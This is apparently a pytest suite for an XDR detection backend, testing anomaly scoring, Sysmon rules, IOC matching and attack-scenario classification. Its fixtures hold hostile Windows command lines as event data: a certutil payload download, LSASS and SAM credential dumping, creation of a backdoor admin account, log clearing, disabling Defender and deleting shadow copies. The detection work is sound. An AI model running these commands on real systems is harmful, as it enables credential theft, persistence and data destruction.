import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, str(Path(__file__).parents[1] / "backend"))

from ai.datasets import to_server_event
from ai.detector import AnomalyDetector, save_model, train_model
from ai.features import FEATURE_NAMES, group_windows, window_features
from detection.ioc_engine import match_iocs
from detection.rule_engine import load_default_rules, match_event
from main import app

BENIGN_IMAGES = [
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Windows\\System32\\conhost.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Program Files\\Microsoft VS Code\\Code.exe",
]


def edr_event(event_type: str, data: dict, host: str = "PC-01", ts: datetime | None = None) -> dict:
    return {
        "event_type": event_type,
        "source": "edr",
        "host_id": host,
        "timestamp": (ts or datetime(2026, 11, 1, 9, 0, tzinfo=timezone.utc)).isoformat(),
        "raw": {"source": "sysmon", "event_type": event_type, "data": data},
    }


def benign_window(rng: random.Random) -> list[dict]:
    events = []
    for _ in range(rng.randint(0, 6)):
        events.append(edr_event("process_create", {"Image": rng.choice(BENIGN_IMAGES),
                                                   "CommandLine": "app.exe --type=renderer",
                                                   "ParentImage": "C:\\Windows\\explorer.exe"}))
    for _ in range(rng.randint(0, 12)):
        events.append(edr_event("network_connect", {"DestinationIp": rng.choice(["10.0.0.5", "142.250.4.100", "20.190.1.10"]),
                                                    "DestinationPort": rng.choice(["443", "443", "80"])}))
    for _ in range(rng.randint(0, 8)):
        events.append(edr_event("dns_query", {"QueryName": rng.choice(["www.google.com", "login.microsoftonline.com", "github.com"])}))
    for _ in range(rng.randint(0, 5)):
        events.append(edr_event("file_create", {"TargetFilename": "C:\\Users\\a\\AppData\\Local\\Temp\\x.tmp"}))
    for _ in range(rng.randint(0, 3)):
        events.append(edr_event("registry_set", {"TargetObject": "HKCU\\Software\\App\\Settings"}))
    return events


def attack_events(host: str = "PC-01", ts: datetime | None = None) -> list[dict]:
    events = [
        edr_event("process_create", {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                     "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
                                     "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}, host, ts),
        edr_event("process_create", {"Image": "C:\\Windows\\System32\\certutil.exe",
                                     "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe",
                                     "ParentImage": "C:\\Windows\\System32\\cmd.exe"}, host, ts),
        edr_event("process_create", {"Image": "C:\\Users\\Public\\p.exe", "CommandLine": "p.exe",
                                     "Hashes": "MD5=AAA,SHA256=DEADBEEF00"}, host, ts),
        edr_event("file_create", {"TargetFilename": "C:\\Users\\Public\\p.exe"}, host, ts),
        edr_event("registry_set", {"TargetObject": "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd"}, host, ts),
        edr_event("process_access", {"TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010"}, host, ts),
    ]
    for port in range(20, 60):
        events.append(edr_event("network_connect", {"DestinationIp": f"10.0.0.{port}", "DestinationPort": str(port)}, host, ts))
    return events


@pytest.fixture(scope="module")
def bundle() -> dict:
    rng = random.Random(7)
    return train_model([window_features(benign_window(rng)) for _ in range(400)], target_fpr=0.01)


def test_window_features_capture_attack_behaviour() -> None:
    features = window_features(attack_events())
    assert set(features) == set(FEATURE_NAMES)
    assert features["process_count"] == 3
    assert features["shell_process_count"] == 1
    assert features["lolbin_process_count"] == 1
    assert features["suspicious_cmdline_count"] == 2
    assert features["office_spawn_count"] == 1
    assert features["user_writable_exec_count"] == 1
    assert features["executable_file_create_count"] == 1
    assert features["persistence_registry_count"] == 1
    assert features["lsass_access_count"] == 1
    assert features["unique_dst_port"] == 40


def test_group_windows_splits_by_host_and_five_minutes() -> None:
    base = datetime(2026, 11, 1, 9, 0, tzinfo=timezone.utc)
    events = [edr_event("dns_query", {}, "A", base), edr_event("dns_query", {}, "A", base + timedelta(minutes=4)),
              edr_event("dns_query", {}, "A", base + timedelta(minutes=5)), edr_event("dns_query", {}, "B", base)]
    windows = group_windows(events)
    assert sorted((host, len(items)) for (host, _), items in windows.items()) == [("A", 1), ("A", 2), ("B", 1)]


def test_detector_flags_attack_and_explains_it(bundle: dict) -> None:
    detector = AnomalyDetector(bundle)
    rng = random.Random(99)
    benign_results = detector.score_many([window_features(benign_window(rng)) for _ in range(200)])
    attack_result = detector.score(window_features(attack_events()))

    assert attack_result["is_anomaly"]
    assert attack_result["ai_score"] >= 0.8
    assert attack_result["top_features"]
    assert sum(r["is_anomaly"] for r in benign_results) / len(benign_results) < 0.05


def test_dataset_conversion_matches_edr_agent_format() -> None:
    otrf = {"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "Hostname": "WS5",
            "@timestamp": "2020-12-19T07:50:03.060Z", "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd /c whoami", "Message": "ignored"}
    event = to_server_event(otrf)
    assert event["event_type"] == "process_create" and event["host_id"] == "WS5"
    assert event["raw"]["data"]["Image"].endswith("cmd.exe") and "Message" not in event["raw"]["data"]

    export = {"Computer": "PC", "Channel": "Microsoft-Windows-Sysmon/Operational", "EventId": 22,
              "TimeCreated": "2026-11-05T08:47:52.0153635Z", "EventData": {"QueryName": "example.com"}}
    assert to_server_event(export)["event_type"] == "dns_query"

    # The EDR agent forwards Sysmon 10 only for lsass; offline data must follow the same filter.
    non_lsass = {**otrf, "EventID": 10, "TargetImage": "C:\\Windows\\explorer.exe"}
    assert to_server_event(non_lsass) is None
    assert to_server_event({**otrf, "Channel": "Security", "EventID": 4688}) is None


def test_rules_match_real_sysmon_events() -> None:
    rules = load_default_rules()
    matched = {rule["id"] for event in attack_events() for rule in match_event(event, rules)}
    assert {"edr-encoded-powershell", "edr-office-spawns-shell", "edr-certutil-download",
            "edr-run-key-persistence", "edr-lsass-access"} <= matched
    benign = edr_event("process_create", {"Image": BENIGN_IMAGES[1], "CommandLine": "chrome.exe"})
    assert match_event(benign, rules) == []


def test_ioc_matching_parses_sysmon_hashes_and_subdomains() -> None:
    iocs = {"ips": {"203.0.113.9"}, "domains": {"evil.test"}, "file_hashes": {"deadbeef00"}}
    hits = match_iocs(attack_events()[2], iocs)
    assert [hit["id"] for hit in hits] == ["ioc-hash"]
    dns = edr_event("dns_query", {"QueryName": "cdn.evil.test"})
    assert match_iocs(dns, iocs)[0]["name"] == "IOC match (domain): evil.test"


@pytest.fixture
def client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, bundle: dict) -> TestClient:
    model_file = tmp_path / "model.joblib"
    save_model(bundle, model_file)
    monkeypatch.setenv("XDR_DATABASE_PATH", str(tmp_path / "xdr.sqlite3"))
    monkeypatch.setenv("XDR_AI_MODEL_PATH", str(model_file))
    monkeypatch.setenv("XDR_AI_ENABLED", "0")
    monkeypatch.setenv("XDR_AGENT_KEY", "test-agent-secret")
    monkeypatch.setenv("XDR_BOOTSTRAP_ADMIN_USERNAME", "admin")
    monkeypatch.setenv("XDR_BOOTSTRAP_ADMIN_PASSWORD", "test-admin-password")
    with TestClient(app) as test_client:
        login = test_client.post("/api/auth/login", json={"username": "admin", "password": "test-admin-password"})
        test_client.headers["Authorization"] = f"Bearer {login.json()['access_token']}"
        yield test_client


def test_end_to_end_ai_window_creates_alert_and_enriches_rule_alerts(client: TestClient) -> None:
    ts = datetime.now(timezone.utc) - timedelta(minutes=15)
    batch = []
    for index, event in enumerate(attack_events("victim-01", ts)):
        batch.append({**event["raw"], "computer": "victim-01", "record_id": str(index), "timestamp": event["timestamp"]})
    response = client.post("/api/events/batch", json=batch,
                           headers={"X-Agent-Id": "agent-01", "X-Agent-Key": "test-agent-secret"})
    assert response.json() == {"received": len(batch), "duplicates": 0}

    rule_alerts = client.get("/api/alerts").json()
    assert rule_alerts and all(alert["ai_score"] == 0.0 for alert in rule_alerts)
    risk_before = {alert["alert_id"]: alert["risk_score"] for alert in rule_alerts}

    status = client.get("/api/ai/status").json()
    assert status["enabled"] and status["features"] == FEATURE_NAMES
    assert set(status["feature_p99"]) == set(FEATURE_NAMES)  # used by the dashboard explanation

    result = client.post("/api/ai/analyze").json()
    assert result["analyzed"] == 1 and result["anomalies"] == 1
    assert client.post("/api/ai/analyze").json()["analyzed"] == 0  # windows are analysed once

    alerts = client.get("/api/alerts").json()
    ai_alerts = [alert for alert in alerts if alert["rule_id"] == "ai-anomaly"]
    assert len(ai_alerts) == 1 and ai_alerts[0]["title"].startswith("AI: ") and "victim-01" in ai_alerts[0]["title"]
    # No scenario model here: the scenario is named from the deviating features.
    assert {"T1003.001", "T1547.001"} <= set(ai_alerts[0]["mitre_attack"])
    for alert in alerts:
        if alert["alert_id"] in risk_before:
            assert alert["ai_score"] > 0.5
            assert alert["risk_score"] >= risk_before[alert["alert_id"]]

    windows = client.get("/api/ai/windows", params={"anomalies_only": True}).json()
    assert windows[0]["host_id"] == "victim-01" and windows[0]["alert_id"] == ai_alerts[0]["alert_id"]
    assert windows[0]["scenario"]["source"] == "heuristic" and windows[0]["detected_by"] == ["anomaly"]
    assert windows[0]["scenario"]["id"] in {"execution", "credential_access", "persistence", "port_scan"}
    incident_ids = {alert["incident_id"] for alert in alerts}
    assert len(incident_ids) == 1  # rule and AI alerts land in the same host incident


def test_analyze_without_model_reports_status(client: TestClient, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.setenv("XDR_AI_MODEL_PATH", str(tmp_path / "missing.joblib"))
    assert client.post("/api/ai/analyze").json()["status"] == "model_not_trained"
    assert client.get("/api/ai/status").json()["enabled"] is False


# ------------------------------------------------------------ multi-source + scenarios

from ai.assets import AssetMap  # noqa: E402
from ai.scenarios import (ScenarioClassifier, heuristic_scenario, label_windows, load_runs,  # noqa: E402
                          train_scenario_model)
from ai.train_scenarios import split_holdout  # noqa: E402

LAB_ASSETS = {
    "internal_networks": ["10.10.0.0/16"],
    "untrusted_networks": ["10.10.10.0/24"],
    "hosts": [{"host_id": "WIN10-01", "ips": ["10.10.20.100"], "aliases": ["DESKTOP-ABC"]},
              {"host_id": "WEB-SRV", "ips": ["10.10.50.20"], "aliases": ["web-server"]}],
}
T0 = datetime(2026, 11, 20, 3, 0, tzinfo=timezone.utc)


def wazuh_event(event_id: str, ts: datetime, agent: str = "win10-01", ip: str = "10.10.10.50",
                logon_type: str = "3", groups: list[str] | None = None, description: str = "") -> dict:
    if groups is None:
        groups = ["windows", "authentication_failed"] if event_id == "4625" else ["windows", "authentication_success"]
    return {"event_type": "wazuh_alert", "source": "wazuh", "host_id": agent, "timestamp": ts.isoformat(),
            "raw": {"agent": {"name": agent}, "rule": {"groups": groups, "description": description},
                    "data": {"srcip": ip, "win": {"system": {"eventID": event_id},
                                                  "eventdata": {"ipAddress": ip, "logonType": logon_type}}}}}


def suricata_event(signature: str, ts: datetime, src: str = "10.10.10.50", dst: str = "10.10.20.100",
                   category: str = "", event_type: str = "network_alert") -> dict:
    return {"event_type": event_type, "source": "suricata", "host_id": src, "timestamp": ts.isoformat(),
            "raw": {"src_ip": src, "dest_ip": dst, "alert": {"signature": signature, "category": category}}}


def test_asset_map_puts_every_source_on_the_victim_host() -> None:
    assets = AssetMap(LAB_ASSETS)
    edr = edr_event("process_create", {"Image": "C:\\x.exe"}, "DESKTOP-ABC", T0)
    events = [edr, wazuh_event("4625", T0), suricata_event("ET SCAN Nmap", T0),
              suricata_event("ET POLICY response", T0, src="10.10.20.100", dst="10.10.10.50"),
              suricata_event("ET WEB_SERVER SQL Injection", T0, dst="10.10.50.20")]
    windows = group_windows(events, assets=assets)
    assert sorted((host, len(items)) for (host, _), items in windows.items()) == [("WEB-SRV", 1), ("WIN10-01", 4)]
    # Flow metadata and alerts that involve no monitored host are ignored.
    assert assets.resolve(suricata_event("x", T0, event_type="suricata_flow")) is None
    assert assets.resolve(suricata_event("x", T0, src="8.8.8.8", dst="10.10.10.9")) is None


def test_multi_source_features_capture_bruteforce_rdp_and_sqli() -> None:
    assets = AssetMap(LAB_ASSETS)
    events = [wazuh_event("4625", T0, ip=f"10.10.10.{50 + i % 2}") for i in range(30)]
    events += [wazuh_event("4624", T0, logon_type="10")]
    events += [suricata_event("ET SCAN Possible Nmap User-Agent Observed", T0),
               suricata_event("ET SCAN Behavioral Unusual Port 3389 traffic Potential Brute Force", T0),
               suricata_event("ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT", T0, dst="10.10.50.20",
                              category="Web Application Attack"),
               wazuh_event("", T0, agent="web-server", groups=["web", "accesslog", "attack", "sql_injection"],
                           description="SQL injection attempt.")]
    windows = {host: window_features(items) for (host, _), items in group_windows(events, assets=assets).items()}
    win, web = windows["WIN10-01"], windows["WEB-SRV"]
    assert win["auth_failure_count"] == 30 and win["auth_failure_src_count"] == 2
    assert win["rdp_logon_count"] == 1 and win["auth_success_after_failures"] == 1
    assert win["ids_alert_count"] == 2 and win["ids_scan_count"] == 2 and win["ids_bruteforce_count"] == 1
    assert win["ids_attacker_count"] == 1
    assert web["ids_web_attack_count"] == 1 and web["web_attack_count"] == 1
    assert web["sqli_count"] == 2  # Suricata UNION SELECT + Wazuh sql_injection rule


def _proc(image: str, cmd: str, parent: str = "C:\\Windows\\explorer.exe") -> dict:
    return edr_event("process_create", {"Image": f"C:\\Windows\\System32\\{image}", "CommandLine": cmd,
                                        "ParentImage": parent})


def test_endpoint_technique_features() -> None:
    attack = [
        _proc("whoami.exe", "whoami /all"), _proc("net.exe", "net user"), _proc("net1.exe", "net1 user"),
        _proc("systeminfo.exe", "systeminfo"), _proc("nltest.exe", "nltest /dclist:"),
        _proc("reg.exe", "reg save HKLM\\SAM C:\\Users\\Public\\sam"),
        _proc("rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 l.dmp full"),
        _proc("cmd.exe", "cmd.exe /Q /c hostname", "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"),
        _proc("PSEXESVC.exe", "PSEXESVC.exe"),
        _proc("sc.exe", "sc \\\\10.10.20.101 create upd binPath= C:\\t.exe"),
        _proc("net.exe", "net user backdoor P@ssw0rd! /add"),
        _proc("net.exe", "net localgroup administrators backdoor /add"),
        _proc("wevtutil.exe", "wevtutil cl Security"),
        _proc("WindowsPowerShell\\v1.0\\powershell.exe", "powershell Set-MpPreference -DisableRealtimeMonitoring $true"),
        _proc("vssadmin.exe", "vssadmin delete shadows /all /quiet"),
        _proc("bcdedit.exe", "bcdedit /set {default} recoveryenabled no"),
        edr_event("file_create", {"TargetFilename": "C:\\Users\\a\\Desktop\\HOW_TO_DECRYPT.txt"}),
        edr_event("file_create", {"TargetFilename": "C:\\Users\\a\\Documents\\report.docx.locked"}),
        edr_event("dns_query", {"QueryName": "aGVsbG8gd29ybGQgdGhpcyBpcyBleGZpbHRyYXRpb24gZGF0YQ.t.evil.test"}),
    ]
    f = window_features(attack)
    assert f["discovery_cmd_count"] == 4  # whoami, net (net1 counted as net), systeminfo, nltest
    assert f["credential_dump_cmd_count"] == 2
    assert f["remote_exec_count"] == 2  # shell spawned by WMI + PsExec service
    assert f["service_install_count"] == 1 and f["account_change_count"] == 2
    assert f["defense_evasion_count"] == 2 and f["inhibit_recovery_count"] == 2
    assert f["ransom_note_count"] == 2 and f["long_dns_query_count"] == 1 and f["max_dns_query_length"] > 60

    # Benign look-alikes must stay at zero.
    benign = window_features([
        _proc("whoami.exe", "whoami /user /fo csv /nh", "C:\\Program Files\\Microsoft VS Code\\Code.exe"),
        _proc("wevtutil.exe", "wevtutil.exe im C:\\app\\manifest.man"),
        _proc("WmiPrvSE.exe", "wmiprvse.exe -Embedding", "C:\\Windows\\System32\\svchost.exe"),
        edr_event("file_create", {"TargetFilename": "C:\\proj\\node_modules\\pkg\\README.md"}),
        edr_event("dns_query", {"QueryName": "update.code.visualstudio.com"}),
    ])
    for name in ("credential_dump_cmd_count", "remote_exec_count", "service_install_count", "account_change_count",
                 "defense_evasion_count", "inhibit_recovery_count", "ransom_note_count", "long_dns_query_count"):
        assert benign[name] == 0, name
    assert benign["discovery_cmd_count"] == 1


def test_wazuh_and_suricata_technique_features() -> None:
    assets = AssetMap(LAB_ASSETS)
    events = [wazuh_event("4720", T0, groups=["windows", "adduser"]),
              wazuh_event("4732", T0, groups=["windows", "group_changed"]),
              wazuh_event("7045", T0, groups=["windows", "policy_changed"]),
              wazuh_event("1102", T0, groups=["windows", "logs_cleared"]),
              suricata_event("ET DOS Possible SYN Flood", T0, dst="10.10.50.20"),
              suricata_event("ET SCAN Suspicious inbound to MSSQL port 1433", T0, dst="10.10.50.20")]
    windows = {host: window_features(items) for (host, _), items in group_windows(events, assets=assets).items()}
    assert windows["WIN10-01"]["account_change_count"] == 2
    assert windows["WIN10-01"]["service_install_count"] == 1 and windows["WIN10-01"]["defense_evasion_count"] == 1
    assert windows["WEB-SRV"]["ids_dos_count"] == 1
    assert windows["WEB-SRV"]["sqli_count"] == 0 and windows["WEB-SRV"]["ids_web_attack_count"] == 0


def test_heuristic_names_the_new_scenarios() -> None:
    def dev(*features: str) -> list[dict]:
        return [{"feature": name, "value": 3, "baseline_p99": 0, "ratio": 4} for name in features]

    expected = {
        ("discovery_cmd_count",): "discovery",
        ("remote_exec_count", "discovery_cmd_count", "shell_process_count"): "lateral_movement",
        ("account_change_count",): "account_manipulation",
        ("defense_evasion_count",): "defense_evasion",
        ("inhibit_recovery_count", "file_create_count", "discovery_cmd_count"): "ransomware",
        ("long_dns_query_count", "max_dns_query_length"): "dns_tunneling",
        ("ids_dos_count",): "dos",
        ("credential_dump_cmd_count",): "credential_access",
    }
    for features, scenario in expected.items():
        result = heuristic_scenario(dev(*features))
        assert result["id"] == scenario, (features, result["id"])
    assert "T1490" in heuristic_scenario(dev("inhibit_recovery_count"))["mitre"]


def test_heuristic_names_the_scenario_from_deviating_features() -> None:
    def dev(feature: str, ratio: float) -> dict:
        return {"feature": feature, "value": 1, "baseline_p99": 0, "ratio": ratio}

    assert heuristic_scenario([dev("auth_failure_count", 31)])["id"] == "bruteforce"
    assert heuristic_scenario([dev("ids_web_attack_count", 4), dev("web_attack_count", 3)])["id"] == "web_attack"
    assert heuristic_scenario([dev("ids_web_attack_count", 9), dev("sqli_count", 2)])["id"] == "sql_injection"
    chain = heuristic_scenario([dev("rdp_logon_count", 2), dev("suspicious_cmdline_count", 3),
                                dev("persistence_registry_count", 2)])
    assert chain["id"] == "rdp_compromise" and {"T1021.001", "T1547.001"} <= set(chain["mitre"])
    assert heuristic_scenario([])["id"] == "unknown"


def _scenario_row(rng: random.Random, scenario: str) -> dict:
    # A third of the windows have no endpoint activity at all (idle host, or only network/Wazuh data).
    row = window_features(benign_window(rng) if rng.random() > 0.33 else [])
    if scenario == "bruteforce":
        ids = rng.randint(0, 5)
        row.update(auth_failure_count=rng.randint(20, 200), auth_failure_src_count=1,
                   ids_bruteforce_count=ids, ids_alert_count=ids)
    elif scenario == "sql_injection":
        row.update(ids_web_attack_count=rng.randint(3, 60), ids_alert_count=rng.randint(3, 60),
                   web_attack_count=rng.randint(0, 40), ids_attacker_count=1)
    elif scenario == "port_scan":
        row.update(ids_scan_count=rng.randint(2, 30), ids_alert_count=rng.randint(2, 30), ids_attacker_count=1)
    return row


def test_scenario_classifier_recognises_lab_scenarios() -> None:
    rng = random.Random(3)
    labels = ["benign"] * 150 + ["bruteforce"] * 30 + ["sql_injection"] * 30 + ["port_scan"] * 30
    classifier = ScenarioClassifier(train_scenario_model([_scenario_row(rng, label) for label in labels], labels))
    tests = {label: _scenario_row(rng, label) for label in ("benign", "bruteforce", "sql_injection", "port_scan")}
    predictions = dict(zip(tests, classifier.predict_many(list(tests.values()))))
    assert {label: p["id"] for label, p in predictions.items()} == {label: label for label in tests}
    assert not predictions["benign"]["is_attack"] and predictions["bruteforce"]["is_attack"]
    assert predictions["bruteforce"]["mitre"] == ["T1110"]


def test_runs_csv_labels_windows_and_holdout_keeps_runs_whole(tmp_path: Path) -> None:
    csv_file = tmp_path / "runs.csv"
    csv_file.write_text("scenario,start,end,host\n"
                        "bruteforce,2026-11-20T03:00:00Z,2026-11-20T03:08:00Z,WIN10-01\n"
                        "bruteforce,2026-11-20T04:00:00Z,2026-11-20T04:04:00Z,WIN10-01\n"
                        "sql_injection,2026-11-20T05:00:00Z,2026-11-20T05:04:00Z,WEB-SRV\n", encoding="utf-8")
    runs = load_runs(csv_file)
    windows = {("WIN10-01", T0): [], ("WIN10-01", T0 + timedelta(minutes=5)): [],
               ("WEB-SRV", T0): [], ("WIN10-01", T0 + timedelta(hours=1)): [],
               ("WEB-SRV", T0 + timedelta(hours=2)): []}
    labelled = label_windows(windows, runs)
    assert {key: run["scenario"] for key, run in labelled.items()} == {
        ("WIN10-01", T0): "bruteforce", ("WIN10-01", T0 + timedelta(minutes=5)): "bruteforce",
        ("WIN10-01", T0 + timedelta(hours=1)): "bruteforce", ("WEB-SRV", T0 + timedelta(hours=2)): "sql_injection"}
    samples = [{"label": run["scenario"], "group": run["run_id"], "window_start": key[1], "features": {}}
               for key, run in labelled.items()]
    samples += [{"label": "benign", "group": "benign", "window_start": T0 + timedelta(minutes=i), "features": {}}
                for i in range(10)]
    train, test = split_holdout(samples, 0.5)
    train_groups, test_groups = {s["group"] for s in train}, {s["group"] for s in test}
    for run in runs:
        assert not (run["run_id"] in train_groups and run["run_id"] in test_groups)  # a run is never split
    assert sum(s["label"] == "benign" for s in test) == 5


def test_end_to_end_wazuh_bruteforce_is_recognised_by_scenario_model(
        tmp_path: Path, monkeypatch: pytest.MonkeyPatch, bundle: dict) -> None:
    import json

    import joblib

    rng = random.Random(5)
    labels = ["benign"] * 150 + ["bruteforce"] * 40 + ["sql_injection"] * 40
    joblib.dump(train_scenario_model([_scenario_row(rng, label) for label in labels], labels),
                tmp_path / "scenarios.joblib")
    assets_file = tmp_path / "assets.json"
    assets_file.write_text(json.dumps(LAB_ASSETS), encoding="utf-8")
    model_file = tmp_path / "model.joblib"
    save_model(bundle, model_file)
    settings = {"XDR_DATABASE_PATH": str(tmp_path / "xdr.sqlite3"), "XDR_AI_MODEL_PATH": str(model_file),
                "XDR_AI_SCENARIO_MODEL_PATH": str(tmp_path / "scenarios.joblib"),
                "XDR_AI_ASSETS_PATH": str(assets_file), "XDR_AI_ENABLED": "0",
                "XDR_AGENT_KEY": "k", "XDR_WAZUH_INGEST_KEY": "wazuh-key",
                "XDR_BOOTSTRAP_ADMIN_USERNAME": "admin", "XDR_BOOTSTRAP_ADMIN_PASSWORD": "test-admin-password"}
    for key, value in settings.items():
        monkeypatch.setenv(key, value)

    ts = datetime.now(timezone.utc) - timedelta(minutes=15)
    alerts = []
    for i in range(40):
        record = wazuh_event("4625", ts + timedelta(seconds=i))["raw"]
        alerts.append({**record, "id": f"brute-{i}", "timestamp": (ts + timedelta(seconds=i)).isoformat(),
                       "rule": {"id": "60122", "level": 5, "groups": ["windows", "authentication_failed"],
                                "description": "Logon failure - Unknown user or bad password"}})
    with TestClient(app) as client:
        login = client.post("/api/auth/login", json={"username": "admin", "password": "test-admin-password"})
        client.headers["Authorization"] = f"Bearer {login.json()['access_token']}"
        response = client.post("/api/collectors/wazuh/events", json={"alerts": alerts},
                               headers={"X-Collector-Key": "wazuh-key"})
        assert response.json()["received"] == 40

        status = client.get("/api/ai/status").json()
        assert status["scenario_model"]["enabled"] and status["assets"]["hosts"] == ["WIN10-01", "WEB-SRV"]
        result = client.post("/api/ai/analyze").json()
        assert result["scenarios"] == {"bruteforce": 1}

        window = client.get("/api/ai/windows", params={"anomalies_only": True}).json()[0]
        assert window["host_id"] == "WIN10-01"  # Wazuh agent "win10-01" mapped to the asset
        assert window["scenario"]["id"] == "bruteforce" and window["scenario"]["source"] == "classifier"
        ai_alert = next(a for a in client.get("/api/alerts").json() if a["rule_id"] == "ai-anomaly")
        assert ai_alert["title"].startswith("AI: Brute force đăng nhập trên WIN10-01")
        assert "T1110" in ai_alert["mitre_attack"]
